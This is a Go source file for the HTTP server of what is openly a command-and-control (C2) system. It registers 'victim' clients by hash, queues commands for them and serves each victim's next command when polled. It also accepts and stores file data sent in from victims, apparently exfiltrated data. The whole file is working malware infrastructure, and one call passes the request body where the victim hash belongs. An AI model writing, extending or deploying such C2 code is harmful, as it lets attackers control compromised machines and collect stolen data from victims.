package server

import (
	"assimilate/c2c_server/v2/internal/model"
	"assimilate/c2c_server/v2/internal/types"
	"encoding/json"
	"fmt"
	"io"
	"net/http"
)

func StartServer(serverState *model.ServerState) {
	// Register the proxyHandler with the server state.
	http.HandleFunc("/proxy", func(w http.ResponseWriter, r *http.Request) {
		proxyHandler(w, r, serverState)
	})

	fmt.Println("Running on localhost:8888")

	err := http.ListenAndServe(":8888", nil)
	if err != nil {
		fmt.Println("The Server failed to run:", err)
	}
}

type postHandler func(w http.ResponseWriter, r *http.Request, state *model.ServerState, message string, hashVal []string)

func proxyHandler(w http.ResponseWriter, r *http.Request, state *model.ServerState) {
	message, err := io.ReadAll(r.Body)
	if err != nil {
		fmt.Println("Error reading request body:", err)
		http.Error(w, "Failed to read request body", http.StatusBadRequest)
		return
	}
	defer func() {
		if err := r.Body.Close(); err != nil {
			fmt.Println("Error closing request body:", err)
		}
	}()

	fmt.Println("Message recieved from: ", r.Host)

	queries := r.URL.Query() //check for incoming url queries
	hashVal := queries["DoesHashHaveMessages"]

	switch r.Method {
	case http.MethodGet:
		if len(hashVal) > 0 {
			inputHash := hashVal[0]
			printlNDebug(state, ("received GET value::" + inputHash))
			response := "false"
			if DoesHashHaveMessages(inputHash, state) {
				response = "true"
			}
			if _, err := fmt.Fprintln(w, response); err != nil {
				fmt.Println("Error writing response:", err)
				http.Error(w, "Failed to write response", http.StatusInternalServerError)
			}
		} else {
			http.Error(w, "Missing DoesHashHaveMessages query parameter", http.StatusBadRequest)
		}
	case http.MethodPost:
		incomingHeader := r.Header.Get("IncomingHeader")
		postHandlers := map[string]postHandler{
			"NewClient": func(w http.ResponseWriter, r *http.Request, state *model.ServerState, message string, hashVal []string) {
				registerNewClient(message, state)
				w.WriteHeader(http.StatusOK)
			},
			"IncomingSuperCatData": func(w http.ResponseWriter, r *http.Request, state *model.ServerState, message string, hashVal []string) {
				HandleIncomingCatData(message, state)
				w.WriteHeader(http.StatusOK)
			},
			"RequestCommand": func(w http.ResponseWriter, r *http.Request, state *model.ServerState, message string, hashVal []string) {
				if len(hashVal) > 0 {
					inputHash := hashVal[0]
					if DoesHashHaveMessages(inputHash, state) {
						command := HashGetNextCommand(message, state)
						jsonData, err := json.Marshal(command)
						if err != nil {
							fmt.Println("Error marshalling JSON:", err)
							http.Error(w, "Failed to marshal JSON", http.StatusInternalServerError)
							return
						}
						if _, err := fmt.Fprintln(w, string(jsonData)); err != nil {
							fmt.Println("Error writing response:", err)
							http.Error(w, "Failed to write response", http.StatusInternalServerError)
						}
					} else {
						w.WriteHeader(http.StatusNoContent)
					}
				} else {
					http.Error(w, "Missing DoesHashHaveMessages query parameter for RequestCommand", http.StatusBadRequest)
				}
			},
		}

		if handler, ok := postHandlers[incomingHeader]; ok {
			handler(w, r, state, string(message), hashVal)
		} else {
			fmt.Println("Unknown IncomingHeader:", incomingHeader)
			http.Error(w, "Unknown IncomingHeader", http.StatusBadRequest)
		}
	default:
		http.Error(w, "Method not allowed", http.StatusMethodNotAllowed)
	}
}

// registerNewClient registers a new client in the ClientTree.
func registerNewClient(incomingJson string, state *model.ServerState) {
	var client types.IncomingVictimRequest

	err := json.Unmarshal([]byte(incomingJson), &client)
	if err != nil {
		fmt.Println("Failed to parse client registration JSON:", err)
		return
	}

	state.ClientTreeMutex.Lock()
	defer state.ClientTreeMutex.Unlock()
	// in case if client already exists
	if _, exists := state.ClientTree.Get(client.RequesterHash); !exists {
		victim := types.VictimInfo{
			Hash:     client.RequesterHash,
			Commands: []types.VictimCommand{},
		}
		state.ClientTree.Put(client.RequesterHash, victim)
		fmt.Println("Registered new client with hash:", client.RequesterHash)
	}
}

// DoesHashHaveMessages checks if a given hash has messages in its command queue.
func DoesHashHaveMessages(inputHash string, state *model.ServerState) bool {
	state.ClientTreeMutex.Lock()
	defer state.ClientTreeMutex.Unlock()

	if val, found := state.ClientTree.Get(inputHash); found {
		victim := val.(types.VictimInfo)
		return len(victim.Commands) > 0
	}
	return false
}

// HandleIncomingCatData handles incoming supercat data and stores it in the SuperCatTree.
func HandleIncomingCatData(incomingSuperCatString string, state *model.ServerState) {
	var catData types.IncomingSuperCatData

	err := json.Unmarshal([]byte(incomingSuperCatString), &catData)
	if err != nil {
		fmt.Println("Error decoding IncomingSuperCatData:", err)
		return
	}

	// Check if victim hash exists in clientTree
	state.ClientTreeMutex.Lock()
	_, found := state.ClientTree.Get(catData.Hash)
	state.ClientTreeMutex.Unlock()

	if !found {
		fmt.Println("Supercat data rejected: hash not registered ->", catData.Hash)
		return
	}

	// Store in superCatTree
	state.SuperCatTreeMutex.Lock()
	defer state.SuperCatTreeMutex.Unlock()

	val, exists := state.SuperCatTree.Get(catData.Hash)
	if exists {
		list := val.([]types.IncomingSuperCatData)
		list = append(list, catData)
		state.SuperCatTree.Put(catData.Hash, list)
	} else {
		state.SuperCatTree.Put(catData.Hash, []types.IncomingSuperCatData{catData})
	}

	fmt.Printf("Stored supercat data for %s: %s\n", catData.Hash, catData.Filename)
}

// HashGetNextCommand retrieves the next command for a given hash from the ClientTree.
func HashGetNextCommand(incomingHash string, state *model.ServerState) types.VictimCommand {
	state.ClientTreeMutex.Lock()
	defer state.ClientTreeMutex.Unlock()

	if val, found := state.ClientTree.Get(incomingHash); found {
		victim := val.(types.VictimInfo)
		if len(victim.Commands) > 0 {
			nextCmd := victim.Commands[0]
			victim.Commands = victim.Commands[1:]
			state.ClientTree.Put(incomingHash, victim)
			return nextCmd
		}
	}
	return types.VictimCommand{}
}

func printlNDebug(state *model.ServerState, input string) {
	if state.GlobalDebug {
		println("DEBUG::" + input)
	}
}
